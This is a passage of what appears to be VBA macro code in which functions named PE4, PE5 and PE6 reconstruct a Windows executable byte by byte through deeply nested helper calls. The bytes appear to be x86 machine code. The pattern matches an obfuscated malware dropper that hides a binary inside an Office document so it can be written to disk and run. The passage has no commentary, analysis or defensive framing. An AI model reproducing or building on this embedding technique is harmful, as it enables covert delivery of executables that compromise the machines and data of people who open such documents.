    strPE = A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(strPE, 217), 21), "L"), 193), "@"), 0), 131), 196), 4), "j"), 1), 255), 21), "p"), 193), "@"), 0), "hl"), 213), "@"), 0), "W"), 255), 142), 128), 193), "@"), 0), 139), 29), 128), 193), "@"), 0), 131), 196), 8), "3"), 148), 133), 246), 252), 10), 161), 200), 11), "A"), 0), 223)
    strPE = A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(strPE, 153), 24), 235), "F"), 131), 255), "du"), 21), 139), 13), 172), 2), "Au"), 197), 21), 200), 11), "A"), 0), 193), 225), 5), 241), "l"), 17), 186), 235), ","), 161), 172), 2), "A"), 0), 15), 175), 198), 137), "E"), 244), 131), "E"), 244), 220), 13), 145), 133), "@"), 0)
    strPE = A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(strPE, "&"), 197), 0), 194), "@"), 0), 232), "c"), 134), 0), 0), 139), 13), 200), 11), "A"), 0), 141), 224), 5), 222), "l"), 8), 24), 220), 13), 16), 194), "@"), 0), "_]"), 216), "4U"), 220), 139), "E"), 216), "RPV"), 169), "`"), 213), "@"), 0), 188), 255), 211)
    strPE = A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(strPE, 131), 196), 20), "F"), 131), 254), 163), "|"), 137), "W"), 255), 21), 164), 193), "@"), 0), 131), 196), 4), 161), 184), 11), "A"), 0), 133), 192), 15), 132), "a"), 1), 0), 0), "h"), 168), 213), "@"), 0), "A"), 255), 21), "H"), 193), "@k"), 131), 196), 8), 137), "E"), 252)
    strPE = B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(strPE, 133), 192), 14), 22), "h@"), 213), "@"), 19), 255), 21), "L"), 193), "g"), 0), 131), 196), 4), "j"), 1), 255), 21), "p"), 193), "@"), 0), "h"), 20), 213), "@"), 205), "P"), 255), 21), 128), 193), "@"), 157), 161), 172), 2), 3), 0), "["), 196), 8), 133), 192), 199), "E")
    strPE = B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(strPE, 244), 0), 0), 31), 0), 15), 142), 5), 1), 182), 0), "3"), 221), 171), 200), 11), "A"), 193), 139), "L"), 6), 4), "!"), 20), 6), 154), 141), 133), "D"), 255), 255), 255), "RN"), 201), "Qa"), 245), 0), 139), "="), 200), 11), "Agj"), 11), "h"), 232), "$")

    PE4 = strPE
End Function

Private Function PE5() As String
   Dim strPE As String

    strPE = ""
    strPE = A(B(A(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(strPE, 0), 0), 139), "L>"), 28), 139), "T>{"), 170), "D>"), 20), 137), 131), "#"), 139), "Lj"), 8), 139), "$"), 209), "Q"), 137), 24), 174), 139), "T>"), 229), 129), 25), 244), 1), "d"), 0), 137), "E"), 212), 131), 210), ",5Q"), 232), 131), "\"), 0)
    strPE = A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(strPE, 0), 139), "t"), 220), "R"), 10), 139), 195), 5), 244), 1), 0), 0), "j"), 167), 131), 209), 0), "h"), 232), 207), 0), 0), "QP"), 232), "N"), 133), 138), "9R"), 139), "U"), 212), "P"), 139), "E"), 208), "+"), 216), 139), "="), 220), 27), 194), 129), 195), 244), 1), 28)
    strPE = A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(A(strPE, 0), 131), 208), 0), "j"), 0), "h"), 232), 218), "h"), 0), "PSj@"), 133), 0), 0), 139), 188), 212), 244), "P"), 139), "E"), 208), 5), 244), 1), 0), 210), "j"), 0), 2), 209), 0), "h"), 232), 3), "w"), 0), "Q"), 129), 232), 248), 19), 0), 0), "R"), 139)
    strPE = A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(B(A(B(strPE, "T>"), 4), "P"), 139), 4), ">j"), 207), "h@?"), 15), 0), 8), "P"), 232), 11), 214), 0), " R"), 206), "U"), 252), 141), 141), "?"), 23), 255), 255), "PQh"), 240), 212), "@"), 201), "R"), 255), 131), 128), 193), "@"), 0), 139), "E{"), 131), 196)
    strPE = A(A(A(B(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(B(strPE, "4@"), 139), 13), 172), 2), "A"), 0), 131), 198), " ;"), 193), 137), "E"), 244), 146), 140), "2N"), 255), 255), 139), "E"), 252), "P"), 255), "R"), 250), 193), "@"), 0), 131), 196), 4), 139), "E"), 202), 133), 206), 248), 8), 189), 1), 157), 21), "p"), 193), 201), 30)
    strPE = A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(strPE, "_^["), 139), 229), "]"), 195), 144), 144), 144), 144), 144), "U"), 139), "["), 139), "E"), 254), 139), "M"), 12), "V"), 139), "P"), 16), "Rq"), 16), 139), 208), 2), "aI"), 30), ";"), 193), 188), 22), "|"), 205), ";"), 214), "sF"), 131), 200), 255), "^]"), 195)
    strPE = A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(strPE, 247), 234), "|"), 14), 246), 4), ";"), 130), "v"), 8), 184), 1), 0), 0), 0), "^]"), 195), "3"), 192), "^]"), 195), 144), 144), 144), "U"), 139), 236), 139), "E1"), 139), "O"), 12), "V1P"), 253), 213), "q"), 24), 139), "@"), 28), 139), "I"), 150), ";"), 193)
    strPE = A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(strPE, 127), 22), 162), 4), ";"), 214), "sy"), 191), 200), 255), "^]"), 195), ";"), 34), "|"), 14), 12), 159), "e=v"), 8), 200), 1), 0), 0), 143), "9]"), 195), "3"), 192), "^v"), 195), "j"), 144), 141), "U"), 139), 236), 139), "M"), 216), "S"), 212), "W"), 139)
    strPE = A(A(B(A(B(A(B(A(B(A(B(A(B(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(B(A(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(strPE, "q"), 24), 139), 241), 16), 159), "A"), 28), 139), "Q"), 165), "+"), 247), 27), 194), 139), "U"), 12), 139), "z"), 24), 139), "J"), 16), "eZ"), 20), 4), 250), 139), "J]"), 27), 203), ";"), 183), "%"), 24), "|"), 4), ";"), 169), "s"), 8), ">^"), 131), "6"), 255), 167)
    strPE = A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(B(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(strPE, "]"), 170), ";"), 255), "|"), 136), 153), 4), ";"), 247), "vn_^"), 184), 1), 0), 0), 0), "#"), 200), 195), "_"), 142), "3"), 192), "[]"), 195), 154), 144), 144), "="), 144), "I"), 144), "U"), 139), 246), 151), "E"), 196), 139), "M"), 12), "V"), 139), "P"), 8), 164)
    strPE = A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(A(strPE, 205), 8), 145), "@"), 190), 139), "I`;"), 193), 127), 22), "|"), 4), "P"), 214), 230), 6), 131), 19), 255), "^"), 153), 185), ";"), 193), "|"), 14), 127), 4), ";"), 214), "C"), 8), 184), "v"), 204), 0), 0), "^]"), 195), "3"), 192), "^]"), 195), 144), "D"), 245)
    strPE = B(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(strPE, "n"), 139), "N"), 131), 236), "@"), 175), 160), 11), "A"), 0), 139), 220), "S"), 11), "A"), 226), 153), 139), 165), 192), 11), "A"), 0), "VW"), 139), "="), 196), 11), "A"), 0), "+"), 195), 27), 207), 241), 21), 232), ":A"), 0), 137), 28), 200), 137), "M"), 204), 223), "m")
    strPE = A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(strPE, 200), 139), 245), "d"), 193), "@"), 0), 212), "h"), 236), 231), "@"), 0), 220), "W"), 254), 194), 165), 240), "z]"), 200), 150), 252), 161), 10), 209), 156), 0), 208), 224), 19), "."), 0), "PP"), 161), 168), 11), "A"), 172), "Ph"), 160), 231), "@"), 0), 255), 214), 139)
    strPE = B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(strPE, 13), 0), 24), "A"), 151), 161), 240), 23), "A"), 0), 132), 21), 168), 11), 249), 0), 161), "PJRhP"), 231), "@"), 0), 255), 214), 139), 13), 168), "XA"), 0), "3"), 192), "f"), 7), 244), 23), "A"), 0), "P"), 161), 240), 23), 249), 0), "UPQ")
    strPE = A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(strPE, "h"), 0), 231), 170), 0), "R"), 214), 139), 21), 228), 23), "A"), 0), 161), 240), 23), "r"), 0), 131), 196), "DRPP"), 161), 168), 11), "A"), 0), "Ph"), 176), 230), 143), 0), 255), "a"), 139), 13), 140), 2), "A"), 0), 161), 240), 23), "A"), 0), 139), 21)
    strPE = B(A(A(B(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(B(A(A(strPE, 188), 24), "A"), 189), "QPPRb"), 191), "(@"), 197), 255), 214), 161), 24), 208), "@"), 0), 139), 13), 168), "FA"), 0), "P"), 198), 240), 23), "A"), 0), "P"), 217), "Qh"), 21), 230), "@"), 0), 255), 134), 139), "U"), 204), "J"), 139), 200), "RP")
    strPE = A(A(B(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(B(A(B(strPE, "q("), 240), "A"), 0), "P"), 160), 209), 13), 168), 11), "A"), 0), "Qh"), 174), 229), "@"), 0), 255), 214), 248), 21), 172), 2), "A"), 151), 161), 149), 23), "A"), 0), 11), 196), "TRPP"), 161), 252), 11), "A"), 19), "P"), 212), "X"), 229), "@"), 0), 255)
    strPE = A(A(A(A(A(B(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(strPE, 214), 139), "V"), 184), 2), "A"), 0), 242), 240), 198), "A"), 0), 139), 21), 168), 11), "A"), 0), "QP"), 14), "Rh"), 8), 229), "8"), 0), 255), 214), 161), 184), 2), "A"), 0), 11), 196), "("), 133), 192), "t+"), 161), 204), 2), "A"), 0), 139), 13), 192), 2)
    strPE = B(A(B(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(strPE, 253), 0), 139), 21), 196), 2), "A"), 0), "P"), 161), 16), 23), "AtQ"), 139), 13), 168), 11), 195), 0), "RPQ"), 235), 176), 228), 196), 0), 255), 214), 131), 133), 24), 161), 208), 2), "A"), 0), ".yC"), 25), 139), 196), 168), 11), "A"), 0), "(")
    strPE = B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(B(A(B(A(B(A(A(A(A(A(strPE, 161), 240), 23), 29), 0), "PP"), 28), "h`"), 228), "@"), 0), 255), 214), 131), 196), 185), 161), "h"), 2), "A"), 0), 133), 8), "t"), 30), 161), 176), 207), "A<"), 139), 13), 168), 11), "A"), 0), "P"), 199), 240), 23), "-"), 0), "PP"), 191), "h"), 16), "x")
    strPE = A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(B(A(B(strPE, "h"), 0), "C"), 214), 131), 196), 20), 139), "]z"), 2), "A"), 0), 161), 144), 2), "ALF"), 13), 168), 11), "r"), 0), "R"), 254), 161), 137), 23), "A"), 0), "PPQl"), 184), 227), "@"), 0), "r"), 162), 161), "`"), 2), "A"), 0), 131), 196), 1), 131)
    strPE = B(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(strPE, 248), 1), "u%"), 139), 21), 164), "oA"), 15), 161), 160), 2), "A"), 250), 139), 13), 168), 11), "A"), 0), "RP"), 161), 240), 23), "A"), 0), "PP"), 22), "hh"), 227), "@i"), 140), "*"), 131), 196), 24), 131), "=`=A"), 0), 2), 157), "%")
    strPE = A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(strPE, 139), 21), 164), 2), "A"), 0), 161), 160), 2), "A"), 0), 240), 13), 168), 11), "A"), 0), "RP"), 139), 241), "uA"), 0), 238), "PQh"), 24), 218), "@"), 0), 201), 214), 131), 196), 24), 139), 21), 156), 20), "A~"), 161), "^"), 232), "A"), 0), 139), 13)
    strPE = A(B(A(B(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(B(A(A(strPE, 168), 11), "A"), 194), "RP"), 161), 240), 23), "E"), 0), "PPQh"), 192), 226), "@"), 247), "R"), 214), 221), "E"), 200), 165), 29), "0"), 194), "@"), 0), 131), 196), 24), 10), 224), "c"), 196), "D"), 15), 139), 206), 205), 0), 0), 221), 5), "("), 194), "@"), 0)
    strPE = B(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(strPE, 202), "z"), 200), 161), 240), 155), "A"), 0), 139), 21), 168), 12), "A"), 0), 131), 236), 8), 221), "]"), 200), 219), 5), "v"), 2), 190), 0), 22), "M"), 200), 220), 13), " "), 194), "@"), 0), 180), 28), "$PPRh"), 255), "E@"), 0), 141), 214), 247), "-")
    strPE = B(A(A(B(A(A(A(B(A(A(B(A(B(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(strPE, 167), 2), "A"), 0), 161), 240), 23), "AG"), 131), 196), ":"), 206), "M"), 200), 221), 28), "$PP"), 161), 168), 11), "A"), 0), "Ph"), 142), 226), "@"), 0), "~"), 148), 161), "r"), 2), "A"), 0), 131), "^"), 24), 133), 192), "~iT-"), 160), 2), "A")
    strPE = A(A(A(B(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(A(A(A(A(B(A(B(A(A(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(A(strPE, 198), 161), 240), "oA"), 0), 139), 13), 168), 11), "A"), 0), 131), 247), 153), "XM"), 200), 221), 127), "$"), 131), "PQ"), 14), 184), 225), 218), 0), 255), 214), "y"), 21), 160), 2), "A#"), 145), "&"), 144), 2), "Ag"), 161), ">"), 2), "A"), 0), 139), 13)
    strPE = A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(strPE, 141), 2), 199), 0), 3), "d"), 19), "f"), 172), "U"), 208), 146), "E"), 212), 161), 240), 23), "A"), 0), 223), "m"), 153), 139), 13), 168), 11), 161), 140), 131), 196), 16), "4M"), 222), 221), 28), 157), "#PQh"), 202), 225), "@"), 0), 255), 214), 131), 196), 24)
    strPE = A(B(A(A(B(A(A(B(A(A(A(A(B(A(A(A(B(A(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(B(strPE, "3.3"), 255), "b>"), 224), 137), "U"), 228), "CU"), 240), 137), "U"), 244), 137), "U"), 195), 222), "U"), 236), 130), 21), 172), 2), "A"), 248), "3"), 219), 131), 201), "@"), 184), 255), 255), "~"), 127), 133), 210), 137), "M"), 208), 238), "E"), 144), 255), "&G"), 244)
    strPE = A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(strPE, 137), "&"), 220), 15), 142), 199), 0), 131), 0), 139), 21), 200), 9), "A"), 0), 131), 194), 24), 137), "U"), 3), 139), 21), 172), 2), "A"), 0), 137), 168), 248), 139), 137), 252), "VR"), 248), 137), "U"), 200), 139), 157), 9), ";Bv|"), 21), 127), 204), 139)
    strPE = A(B(A(A(B(A(B(A(A(B(A(A(B(A(A(A(B(A(B(A(A(B(A(B(A(B(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(strPE, "U"), 200), 199), 235), 1), "U"), 252), "r"), 9), 139), "E"), 200), 138), "E"), 239), 139), "B"), 252), "mg"), 139), "R"), 4), "9U"), 220), 137), "U"), 196), "|"), 13), 127), 5), "9M|r"), 6), 164), "M"), 216), 137), "U"), 220), "0U"), 252), 139), "R"), 252)
    strPE = B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(B(A(A(A(B(A(A(B(strPE, "9U"), 244), 137), "@"), 204), 127), 22), "|"), 8), 139), "U"), 240), ";U"), 200), "w"), 12), 139), "U"), 200), 137), "U"), 240), 139), 177), 204), 137), "t"), 244), 139), "U%9U"), 236), "O"), 13), 233), 5), "9M"), 232), "w"), 6), 137), 139), 232), 137), "U")
    strPE = A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(strPE, 236), 139), "U"), 200), 3), 250), 139), "U"), 204), 146), 218), 139), "U"), 224), 3), ">"), 139), "M"), 252), 137), "U"), 216), 139), "U"), 228), 139), "Ia"), 19), 209), "oM"), 248), 137), "U"), 228), 139), 1), 211), 131), 194), " I"), 137), "M"), 248), "OM"), 208), 179)
    strPE = A(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(A(B(strPE, "U"), 252), 15), 133), "N"), 157), 255), 230), 129), "H"), 244), 1), 0), 150), "j"), 0), 127), 208), 0), "h"), 232), 3), 166), 0), "PQ"), 232), "%"), 127), "y"), 0), 139), "M"), 220), 137), "E"), 144), 132), 231), 216), "j"), 0), 5), 244), 1), 0), 0), "h"), 232), 3)
    strPE = A(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(strPE, 0), 0), 131), 209), 137), "-"), 129), 212), "|P"), 232), 3), 230), 0), 0), 139), "M"), 244), "*E"), 235), 139), 187), 210), "j"), 0), 5), 244), 1), 0), 0), "h"), 232), "Pm"), 16), 131), 209), "\"), 137), "U"), 220), "QP"), 31), 225), "~"), 0), 0), 139)
    strPE = A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(A(B(strPE, "M"), 236), 137), "E"), 240), 139), "E"), 232), "j"), 0), 5), 244), 1), 0), 0), "~"), 232), 31), 0), 0), 131), 209), "|"), 137), "U"), 244), "QP"), 232), 31), "~"), 0), 0), 129), 199), 244), 1), 188), 0), "j"), 0), 131), 211), 157), "h"), 232), 3), 0), 0), 191)
    strPE = A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(B(A(A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(strPE, "W"), 137), "E"), 232), 137), "U"), 236), 162), 162), "~"), 0), 0), 189), "M"), 228), "a"), 216), 139), "E"), 224), "j"), 0), 5), 21), 1), 0), 7), "h"), 232), 211), 0), 0), 131), 209), 0), 137), "U"), 204), "QP"), 232), 129), "~"), 0), 0), 223), "E"), 224), 161), 172)
    strPE = B(A(B(A(A(A(A(B(A(A(A(A(B(A(B(A(B(A(B(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(strPE, 2), 171), "5"), 133), 192), 137), 17), 228), 15), 142), "*"), 1), 0), 0), 221), 232), 240), 23), "A"), 0), 161), 168), 11), "A"), 0), "RH#,"), 225), "@"), 0), "D"), 214), 161), 240), 23), "C"), 0), 139), 13), 168), "JA"), 0), "PPPPQ")
    strPE = B(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(A(A(A(A(B(A(A(A(A(B(A(A(B(strPE, "h"), 216), 12), "@"), 0), 255), 214), 139), "U"), 244), 139), 250), 240), 143), "="), 240), 23), "A"), 0), 131), 196), "$"), 139), "M"), 204), "QP"), 161), 172), 2), "Aan"), 152), "RPQ("), 232), 221), "~"), 0), 0), 139), 13), 168), 11), "A"), 0), "R")
    strPE = A(B(A(B(A(A(B(A(A(B(A(B(A(A(A(A(B(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(strPE, 139), "U"), 212), "P"), 139), "E"), 208), "WRPWWQh"), 34), 224), "?"), 209), 255), 214), 199), 172), 218), "A"), 0), 139), "M"), 240), 153), 183), 248), 139), "E"), 232), 131), 144), 34), "+8"), 139), "M"), 236), 137), "U"), 196), 238), "M"), 244), "Q"), 139)
    strPE = A(B(A(B(A(A(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(A(B(A(A(B(A(A(B(A(A(B(A(B(A(B(A(B(A(A(A(B(strPE, "M"), 228), 235), 161), "E"), 23), "E"), 0), "PR"), 139), "U7WQR"), 232), 209), ">"), 175), 0), "b"), 240), 221), "U"), 196), 249), 139), 209), 216), "WRS"), 137), "E"), 248), 137), "N"), 252), 186), 136), "}"), 158), 0), 139), "M"), 248), "+6"), 139)
    strPE = A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(B(A(B(A(B(A(A(A(B(A(A(A(B(strPE, "E"), 146), 27), 194), "P"), 161), 240), 206), "A"), 0), "Q"), 139), "]"), 182), 139), "U"), 208), 139), "}"), 212), 139), 203), 24), 28), 139), "U"), 220), 152), 215), "P1QPP"), 161), 168), 11), "A"), 0), "Ph "), 224), "@"), 0), 255), 214), 139), "M"), 236)
    strPE = B(A(B(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(A(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 205), 3), 232), 161), 169), 220), "A"), 0), 139), "="), 240), 23), "A"), 0), 131), 196), "0Q"), 139), "M"), 224), 8), 171), 139), "gP"), 139), "EePQ"), 232), "^}"), 0), 0), "R"), 139), 131), 220), 255), 161), 168), 11), "A"), 0), "WR=W")
    strPE = B(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(A(A(B(A(A(B(A(A(A(A(A(A(A(A(B(A(B(strPE, "W"), 6), "h"), 200), 223), 253), 0), 255), 214), 131), 196), "0h"), 184), 223), "@"), 0), 255), 214), 131), 189), 250), "_^["), 139), 229), 180), 195), 144), 144), 144), "U"), 139), 236), 131), 236), 215), 165), 168), 2), "A"), 0), 204), 13), 16), 208), "@"), 9), "S")
    strPE = A(B(A(B(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(A(A(B(A(B(strPE, "V5"), 193), "W"), 15), 141), 254), 1), 171), 0), "3u"), 8), "3"), 219), 139), 6), 137), "^"), 12), ";"), 195), 137), 175), 16), "'"), 158), 142), 8), 0), 6), 137), 158), " "), 8), 0), 0), 137), 158), "("), 8), 0), 171), 137), 152), 20), "t"), 8), "P"), 232)
    strPE = B(A(B(A(A(A(A(A(B(A(B(A(A(A(B(A(B(A(B(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(A(A(A(B(strPE, "8E"), 0), 0), 245), 15), 139), 13), 22), "@A"), 0), "SSQV"), 232), 167), 212), 0), 0), 139), 251), 161), 252), 23), "A"), 0), "RS"), 139), "H"), 16), 141), 157), "pj"), 1), "QW"), 232), 31), 192), 0), 179), ";?t"), 14), "P")
    strPE = A(B(A(B(A(B(A(B(A(A(A(A(A(B(A(A(B(A(B(A(A(A(B(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(B(strPE, "O8"), 3), "@"), 0), 232), 139), 229), 255), 255), 131), 196), 8), 139), 23), "j"), 1), 14), 8), "R"), 232), 193), "T"), 0), 0), ";"), 195), 225), 14), "Ph("), 232), "@"), 0), 232), "B"), 229), 221), 255), 147), 196), "p"), 161), "l"), 2), "A"), 0), ";"), 195)
    strPE = A(A(B(A(A(A(B(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(B(A(A(A(A(B(A(A(A(B(A(A(B(A(A(B(A(B(A(A(B(strPE, "tQP"), 139), 0), "j"), 215), "P"), 232), 155), "T"), 0), 0), ";"), 195), 14), 21), "="), 208), 17), 1), 0), "t"), 14), "Ph"), 20), 232), 240), 0), 232), 163), 229), 255), 255), 131), 196), 8), 139), 13), "l"), 2), "A"), 0), 139), 23), "Qh"), 128), 0)
    strPE = B(A(A(A(A(A(A(A(B(A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(B(A(B(A(A(strPE, 0), 0), "R"), 232), "n"), 170), 0), 0), ";"), 195), "t"), 241), "="), 135), "1>"), 0), "t"), 14), "Ph"), 252), 231), "*"), 0), 232), 232), 228), 255), 255), 131), 196), 8), 232), 160), "0"), 0), 0), 140), 157), 11), "A"), 0), 137), 21), 194), 11), 34), 0), "y")

    PE5 = strPE
End Function

Private Function PE6() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(B(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(B(A(A(B(A(A(A(B(A(A(A(A(A(B(A(A(A(B(A(A(A(A(A(A(B(A(A(A(strPE, 23), 137), 134), "0"), 8), 0), 255), 161), 164), 11), "A"), 0), 137), 134), "4"), 8), 0), 0), 139), 13), "T"), 23), 239), 0), "QR"), 232), 175), "."), 0), 8), 139), 216), 133), 219), 15), 132), 200), 0), 23), 0), 147), 251), 241), "u"), 9), 0), 15), 132), 133)
    strPE = B(A(A(A(B(A(B(A(B(A(B(A(B(A(B(A(A(A(A(A(A(A(B(A(A(A(A(B(A(A(A(A(B(A(A(B(A(A(A(A(A(A(strPE, 181), 0), 182), 129), 209), 180), "#"), 11), 0), "t}"), 139), 21), 248), 23), "A"), 0), 139), 7), 141), "M@"), 199), 150), 240), 1), 0), 228), 0), "QR"), 137), "E>"), 232), ";("), 0), "8p"), 7), "P"), 232), "C."), 0), 0), 139), "=3")
    strPE = B(A(A(B(A(B(A(B(A(A(A(B(A(A(B(A(B(A(A(A(A(B(A(B(A(A(A(A(B(A(A(B(A(A(A(A(B(A(B(A(B(A(A(A(B(strPE, "EAK"), 161), 184), 2), "A"), 0), "G'"), 154), "@"), 131), 18), 10), 137), "="), 196), 2), "A"), 0), 163), 188), 2), "A"), 0), "~#"), 139), 135), 200), 192), "@"), 0), "h"), 174), 210), "@"), 0), 131), 194), "@R"), 255), "?"), 128), "h"), 140), 0), "S")
